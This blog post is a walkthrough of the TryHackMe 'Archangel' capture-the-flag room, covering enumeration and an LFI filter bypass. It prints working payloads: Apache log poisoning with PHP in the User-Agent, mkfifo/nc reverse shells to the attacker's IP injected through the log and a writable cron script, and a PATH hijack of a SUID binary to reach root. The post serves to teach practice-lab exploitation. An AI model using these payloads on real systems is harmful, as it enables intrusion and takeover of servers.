---
layout: post
author: Razor
title: "Tryhackme Archangel"
categories: [Tryhackme, Linux]
tags: [medium-box, lfi, boot2root, privilage escalation, web exploitation, reversing binary]     # TAG names should always be lowercase
image: assets/thm_archangel/bg.jpg
toc: true
---

## Introduction
This is partical room from tryhackme entitled archangel with easy difficulty, but for me its medium difficulty. In this room we will learn about boot2root, Web Exploitation. room link [here](https://tryhackme.com/room/archangel)

## Enumeration
### nmap
First we must scanning the box with nmap for enumeration. 
```
$ sudo nmap -sC -sV 10.10.172.38
 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-12 15:53 WIB
Nmap scan report for 10.10.40.126
Host is up (0.34s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9f:1d:2c:9d:6c:a4:0e:46:40:50:6f:ed:cf:1c:f3:8c (RSA)
|   256 63:73:27:c7:61:04:25:6a:08:70:7a:36:b2:f2:84:0d (ECDSA)
|_  256 b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Wavefire
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.49 seconds
```

nmap tell us the box have 2 port open which is ssh and webserver. now lets check the webserver
![image](/assets/thm_archangel/bg_1.jpg)
## Flag 1
as you can see the webserver using mafialive.thm lets add this to hosts
```
sudo nano /etc/hosts
                                                  
127.0.0.1       localhost
127.0.1.1       Razor

10.10.172.38 mafialive.thm

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
then lets go to mafialive.thm and here the result
![image](/assets/thm_archangel/bg_2.jpg)

now we got first flag, now lets looking for any directory on this web.

## Flag 2
```
gobuster dir -u http://mafialive.thm/ -w /home/razor/Documents/Wordlist/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://mafialive.thm/
[+] Threads:        10
[+] Wordlist:       /home/razor/Documents/Wordlist/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2021/02/12 19:12:48 Starting gobuster
===============================================================
/test.php (Status: 200)
Progress: 665 / 220561 (0.30%)

```
with gobuster we found file test.php, lets check it
![image](/assets/thm_archangel/bg_3.jpg)
We found flag 1

and when click "here is button" we going to `test.php?view=/var/www/html/development_testing/mrrobot.php` its just output text like `echo 'control is an illusion' `. now lets see the source with using filter php :
``` 
script : "pHp://FilTer/convert.base64-encode/resource= "
now add to test.php :  " http://mafialive.thm/test.php?view=php://FilTer/convert.base64-encode/resource=/var/www/html/development_testing/test.php " 
```


### File Inclusion

Output : 
![image](/assets/thm_archangel/bg_5.jpg)

its base64 encode, lets decode it
```bat
CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE+CiAKICAgIDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2J1dHRvbj48L2E+PGJyPgogICAgICAgIDw/cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRzIG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg== 

- decode : 

<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>
 
    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        <?php

            //FLAG: thm{ex----------f1}

            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
            if(isset($_GET["view"])){
            if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
                include $_GET['view'];
            }else{

                echo 'Sorry, Thats not allowed';
            }
        }
        ?>
    </div>
</body>

</html>

```
## Flag 3
- TL;DR — Apache Log Poisoning
> The idea behind log poisoning is to put some php code (payload) into the logs, and then load them where php will be executed. If we look at the access log, we see that on each visit to the site, there’s an entry written with the url visited and the user-agent string of the browser visiting.
The simplest case would be to change our user-agent string in a such a way that it includes php code, and then include that log file with our LFI.

lets using curl to testing rce


i try to get /etc/passwd and its work!! . now after that letr try exploit by user-agent and look at access.log : 
```
$ curl http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//../var/log/apache2/access.log|
```
### Log Poisoning

then user-agent to exploit 
```bat
curl 'http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//../var/log/apache2/access.log' -H "User-Agent: razor <?php system('id'); ?> rxd"
```
```bat
10.2.47.251 - - [12/Feb/2021:18:53:51 +0530] "GET /test.php?view=/var/www/html/development_testing/..//..//..//..//../var/log/apache2/access.log HTTP/1.1" 200 142433 "-" "razor uid=33(www-data) gid=33(www-data) groups=33(www-data)
 rxd"
```
yeay we got RCE via LFI and log poisoning, now we can get shell. 
```
$ curl 'http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//../var/log/apache2/access.log' -H "User-Agent: razor <?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.47.251 1337 >/tmp/f'); ?> rxd"

```

```
$ nc -lvnp 1337                                                                                              1 ⨯
listening on [any] 1337 ...
connect to [10.2.47.251] from (UNKNOWN) [10.10.172.38] 58492
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ ls
index.html
mrrobot.php
robots.txt
test.php
$ 
```
and we get user flag 
```
$ cat /home/archangel/user.txt
thm{lf----------------ky}
```

## Flag 4

after that we can check crontab : 
```
www-data@ubuntu:/var/www/html/mafialive$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/1 *   * * *   archangel /opt/helloworld.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
www-data@ubuntu:/var/www/html/mafialive$ 
```
You can see there is a crontab from the archangel, now let's check the permissions
```
www-data@ubuntu:/var/www/html/mafialive$ ls -la /opt/helloworld.sh
-rwxrwxrwx 1 archangel archangel 66 Nov 20 10:35 /opt/helloworld.sh
www-data@ubuntu:/var/www/html/mafialive$ 

```
Wow all user can access it, so weird :X. now lets exploit that with sending reverse shell : 
```bat
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.47.251 6969 >/tmp/f' >> /opt/helloworld.sh'
```
then the crontab will be like this :
```
www-data@ubuntu:/var/www/html/mafialive$ cat /opt/helloworld.sh 
#!/bin/bash
echo "hello world" >> /opt/backupfiles/helloworld.txt
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.47.251 6969 >/tmp/f
```
And wait a minute for getting a shell, then we can get the user :
```
$ nc -lvnp 6969
listening on [any] 6969 ...
connect to [10.2.47.251] from (UNKNOWN) [10.10.172.38] 39360
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(archangel) gid=1001(archangel) groups=1001(archangel)
```
and we found the flag of user again
```
archangel@ubuntu:~/secret$ cat user2.txt
cat user2.txt
thm{h0r-------------------------------------r0n}

```
## Privilage Escalation

after get in user archangel we can check the permission :
```
$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/traceroute6.iputils
/usr/bin/sudo
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/bin/umount
/bin/su
/bin/mount
/bin/fusermount
/bin/ping
/home/archangel/secret/backup
```
lets check file backup with strings : 
```bat
archangel@ubuntu:~/secret$ strings backup
strings backup
/lib64/ld-linux-x86-64.so.2
setuid
system
__cxa_finalize
setgid
__libc_start_main
libc.so.6
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
cp /home/user/archangel/myfiles/* /opt/backupfiles
:*3$"
GCC: (Ubuntu 10.2.0-13ubuntu1) 10.2.0
/usr/lib/gcc/x86_64-linux-gnu/10/../../../x86_64-linux-gnu/Scrt1.o
__abi_tag
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
backup.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
_edata
system@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
setgid@@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
setuid@@GLIBC_2.2.5
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.plt.sec
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
archangel@ubuntu:~/secret$
```
i found this :
```
cp /home/user/archangel/myfiles/* /opt/backupfiles
```
In the hint they have also mentioned about “certain paths are dangerous”. This is all coming together, cp command is being executed without absolute path (/bin/cp), that means when this binary get executed, our shell search for “cp” in each directory in the path list to look fo the executable file by that name. Then shell will then run the first matching program it finds.

as we can see this path where its source and destination of copy command is being executed and We can take advantage of this misconfiguration in SUID binary (backup). you can follow my command : 
```
archangel@ubuntu:~/secret$ echo '#!/bin/bash' > cp
archangel@ubuntu:~/secret$ ls
backup  cp  user2.txt
archangel@ubuntu:~/secret$ echo "/bin/bash" >> cp
archangel@ubuntu:~/secret$ chmod +x cp
archangel@ubuntu:~/secret$ cat cp
#!/bin/bash
/bin/bash
```
and we can update path for executing backup 
```
archangel@ubuntu:~/secret$ export PATH=$PWD:$PATH
archangel@ubuntu:~/secret$ echo $PATH
/home/archangel/secret:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
archangel@ubuntu:~/secret$
```
### Flag Root
Now just run the backup : 
```
archangel@ubuntu:~/secret$ ./backup 
root@ubuntu:~/secret# cd
root@ubuntu:~# id
uid=0(root) gid=0(root) groups=0(root),1001(archangel)
root@ubuntu:~# cat /root/root.txt 
thm{p4t--------------------------------------------------------10n}
root@ubuntu:~# 
```
Yeay we get the root flag

Happy hacking :D